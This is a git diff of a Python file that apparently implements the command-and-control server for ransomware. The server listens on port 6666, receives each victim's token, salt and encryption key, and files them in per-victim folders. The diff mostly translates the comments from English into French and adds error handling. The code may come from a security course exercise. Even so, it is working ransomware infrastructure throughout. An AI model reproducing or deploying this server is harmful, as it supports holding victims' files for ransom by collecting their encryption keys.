@@ -1,46 +1,60 @@
 import base64
-from hashlib import sha256
 import hashlib
-from http.server import HTTPServer
 import os
-
+from http.server import HTTPServer
 from cncbase import CNCBase
 
 class CNC(CNCBase):
-    ROOT_PATH = "/root/CNC"
+    ROOT_DIR = "/root/CNC"
 
-    def save_b64(self, token:str, data:str, filename:str):
-        # helper
-        # token and data are base64 field
+    def save_base64(self, token, data, filename):
+        """
+        Cette fonction décode les données en base64 et les enregistre sous forme de fichier.
+        """
+        data_bin = base64.b64decode(data)  # Décodage du base64 en binaire
+        path_fichier = os.path.join(self.ROOT_DIR, token, filename)  # Création du chemin
+        with open(path_fichier, "wb") as fichier:
+            fichier.write(data_bin)  # Écriture des données binaires
 
-        bin_data = base64.b64decode(data)
-        path = os.path.join(CNC.ROOT_PATH, token, filename)
-        with open(path, "wb") as f:
-            f.write(bin_data)
+    def post_new(self, path, params, body):
+        """
+        Cette fonction reçoit les infos envoyées par le ransomware et les enregistre.
+        """
+        try:
+            token = body["token"]  # Récupération du token
+            salt = body["salt"]  # Récupération du sel
+            key = body["key"]  # Récupération de la clé
 
-    def post_new(self, path: str, params: dict, body: dict) -> dict:
-        # Function to register a new ransomware instance
-        token_value = body["token"]  # Retrieve the token
-        self._log.info(f"TOKEN: {token_value}")
-        salt_value = body["salt"]  # Retrieve the salt
-        key_value = body["key"]  # Retrieve the key
-        decrypted_token = hashlib.sha256(base64.b64decode(token_value)).hexdigest()  # Decrypt the token
-        victim_folder = os.path.join(CNC.ROOT_PATH, decrypted_token)  # Create the path for the victim's folder
-        os.makedirs(victim_folder, exist_ok=True)  # Create the victim's folder
+            self._log.info(f"Token reçu: {token}")  # Affichage du token dans les logs
 
-        # Save the salt and key in the victim's folder
-        with open(os.path.join(victim_folder, "salt"), "w") as salt_file:
-            salt_file.write(salt_value)
-        with open(os.path.join(victim_folder, "key"), "w") as key_file:
-            key_file.write(key_value)
+            # On hache le token pour avoir un identifiant unique de victime
+            token_hache = hashlib.sha256(base64.b64decode(token)).hexdigest()
+            dossier_victime = os.path.join(self.ROOT_DIR, token_hache)  # Chemin de la victime
+            os.makedirs(dossier_victime, exist_ok=True)  # Création du dossier si pas encore fait
 
-        # Return a dictionary containing the request status (success or error)
-        if os.path.isdir(victim_folder):
-            return {"status": "Success"}
-        else:
-            return {"status": "Error"}
+            # Enregistrement du sel et de la clé
+            self._ecrire_fichier(dossier_victime, "salt", salt)
+            self._ecrire_fichier(dossier_victime, "key", key)
 
+            # Vérifie si le dossier a bien été créé et retourne le statut
+            if os.path.isdir(dossier_victime):
+                return {"status": "Success"}
+            else:
+                return {"status": "Error"}
+        
+        except KeyError as e:
+            self._log.error(f"Erreur : il manque une donnée -> {e}")
+            return {"status": "Error", "message": f"Donnée manquante : {str(e)}"}
 
-           
-httpd = HTTPServer(('0.0.0.0', 6666), CNC)
-httpd.serve_forever()
+    def _ecrire_fichier(self, dossier, nom_fichier, contenu):
+        """
+        Fonction qui écrit des données dans un fichier.
+        """
+        chemin_fichier = os.path.join(dossier, nom_fichier)
+        with open(chemin_fichier, "w") as fichier:
+            fichier.write(contenu)
+
+# Lancement du serveur
+serveur = HTTPServer(('0.0.0.0', 6666), CNC)
+serveur.serve_forever()
+
